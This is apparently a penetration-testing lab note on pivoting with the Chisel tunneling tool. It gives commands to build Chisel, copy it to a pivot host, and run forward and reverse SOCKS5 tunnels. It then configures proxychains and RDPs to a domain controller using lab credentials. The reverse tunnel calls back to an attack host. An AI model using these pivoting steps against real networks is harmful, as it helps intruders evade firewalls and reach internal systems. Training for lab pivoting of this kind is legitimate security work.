- [Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. 
- `Chisel` can create a client-server tunnel connection in a firewall restricted environment.
## Setting Up & Using Chisel
```shell
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```
#### Transferring Chisel Binary to Pivot Host
```shell
sshpass -p '<pass>' scp chisel ubuntu@10.129.202.64:~/
```
#### Running the Chisel Server on the Pivot Host
```shell
./chisel server -v -p 1234 --socks5
```
#### Connecting to the Chisel Server
```shell
./chisel client -v 10.129.202.64:1234 socks
```
#### Editing & Confirming proxychains.conf
```shell
tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```
#### Pivoting to the DC
```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
## Chisel Reverse Pivot
#### Starting the Chisel Server on our Attack Host
- When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. 
- The server will listen and accept connections, and they will be proxied through the client, which specified the remote. 
- Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.
#### Starting the Chisel Server on our Attack Host
```shell
sudo ./chisel server --reverse -v -p 1234 --socks5
```
Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`
```shell
./chisel client -v 10.10.14.17:1234 R:socks
```
#### Editing & Confirming proxychains.conf
```shell
tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```
#### RDP
```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```